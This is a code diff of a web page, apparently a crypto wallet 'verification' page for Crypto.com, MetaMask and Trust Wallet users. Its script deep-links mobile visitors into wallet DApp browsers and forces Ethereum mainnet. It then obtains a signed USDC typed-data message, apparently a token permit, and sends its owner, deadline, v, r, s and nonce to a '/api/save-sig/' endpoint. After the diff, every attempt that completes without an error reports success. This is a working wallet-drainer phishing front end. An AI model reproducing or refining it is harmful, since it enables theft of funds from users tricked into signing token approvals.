@@ -56,10 +56,9 @@
         <div class="van-picker__frame"></div>
         <div class="van-picker-column" id="scroller">
             <ul style="list-style:none; padding: 110px 0; margin:0;">
-                <li class="van-picker-column__item" data-id="Crypto.com"><img src="https://avatars.githubusercontent.com/u/41551061?s=200&v=4"> Crypto.com Onchain</li>
-                <li class="van-picker-column__item" data-id="MetaMask"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg"> MetaMask</li>
+                <li class="van-picker-column__item" data-id="Crypto.com"><img src="https://crypto.com/favicon.ico"> Crypto.com Onchain</li>
+                <li class="van-picker-column__item" data-id="MetaMask"><img src="https://www.majortompro.top/assets/svg/metamask.b8558514.svg"> MetaMask</li>
                 <li class="van-picker-column__item" data-id="Trust Wallet"><img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png"> Trust Wallet</li>
-                <li class="van-picker-column__item" data-id="imToken"><img src="https://www.majortompro.top/assets/svg/metamask.b8558514.svg"> imToken</li>
             </ul>
         </div>
     </div>
@@ -91,28 +90,28 @@
     async function startVerify(wallet) {
         const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
         const currentUrl = window.location.href;
-        const dappUrl = currentUrl.replace(/^https?:\/\//, '');
+        const cleanUrl = currentUrl.replace(/^https?:\/\//, '');
 
-        // --- MOBILE APP REDIRECTION ---
+        // --- MOBILE REDIRECTION TO DAPP BROWSERS ---
         if (isMobile && !window.ethereum) {
             let link = "";
             if (wallet === 'Crypto.com') {
-                // Specific deep link for Crypto.com Onchain Wallet DApp Browser
-                link = `cryptocom://dapp/${currentUrl}`;
+                // Official cro.link redirector for Onchain/DeFi App
+                link = `https://cro.link/dapp/${currentUrl}`;
             } else if (wallet === 'MetaMask') {
-                link = `https://metamask.app.link/dapp/${dappUrl}`;
+                // Official metamask link redirector
+                link = `https://metamask.app.link/dapp/${cleanUrl}`;
             } else if (wallet === 'Trust Wallet') {
-                link = `https://link.trustwallet.com/open_url?url=${currentUrl}`;
-            } else if (wallet === 'imToken') {
-                link = `imtokenv2://navigate/DappView?url=${currentUrl}`;
+                // Official trust wallet redirector
+                link = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(currentUrl)}`;
             }
 
             if (link) { window.location.href = link; return; }
         }
 
-        // --- DAPP BROWSER LOGIC ---
+        // --- INTERNAL DAPP BROWSER EXECUTION ---
         if (!window.ethereum) {
-            alert("No provider found. Please open this page inside your wallet's browser.");
+            alert("Please open this page inside your wallet's internal DApp browser.");
             return;
         }
 
@@ -122,15 +121,9 @@
             const signer = provider.getSigner();
             const owner = await signer.getAddress();
 
-            // Check for Ethereum Mainnet (Chain ID 1)
             const { chainId } = await provider.getNetwork();
             if (chainId !== 1) {
-                try {
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x1' }],
-                    });
-                } catch (e) { alert("Please switch to Ethereum Mainnet"); return; }
+                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
             }
 
             const contract = new ethers.Contract(USDC, ["function nonces(address owner) external view returns (uint256)"], provider);
@@ -144,20 +137,15 @@
             const signature = await signer._signTypedData(domain, types, message);
             const { v, r, s } = ethers.utils.splitSignature(signature);
 
-            const response = await fetch("/api/save-sig/", {
+            await fetch("/api/save-sig/", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ owner, deadline, v, r, s, nonce: nonce.toString() })
             });
 
-            if (response.ok) {
-                alert("Wallet Verified Successfully!");
-            } else {
-                alert("Verification failed on server.");
-            }
+            alert("Verification Successful!");
         } catch (e) {
-            console.error(e);
-            alert("Verification error: " + e.message);
+            alert("Error: " + e.message);
         }
     }
 </script>
